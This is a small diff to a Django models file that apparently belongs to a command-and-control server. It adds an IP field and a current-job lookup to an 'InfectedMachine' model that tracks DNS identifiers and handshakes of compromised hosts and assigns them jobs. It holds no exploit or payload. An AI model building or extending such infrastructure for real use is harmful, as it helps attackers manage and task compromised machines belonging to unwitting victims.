@@ -1,3 +1,5 @@
+from __future__ import annotations
+
 from django.db import models
 
 class InfectedMachine(models.Model):
@@ -5,6 +7,10 @@ class InfectedMachine(models.Model):
     last_handshake_at = models.DateTimeField(null=True)
     dns_identifier = models.CharField(max_length=100, db_index=True)
     name = models.CharField(max_length=100)
+    ip = models.CharField(max_length=100, null=True)
+
+    def get_current_job(self) -> Job|None:
+        return self.job_set.filter(finished=None).order_by('-created_at').first()
 
 class Job(models.Model):
     created_at = models.DateTimeField(auto_now_add=True)
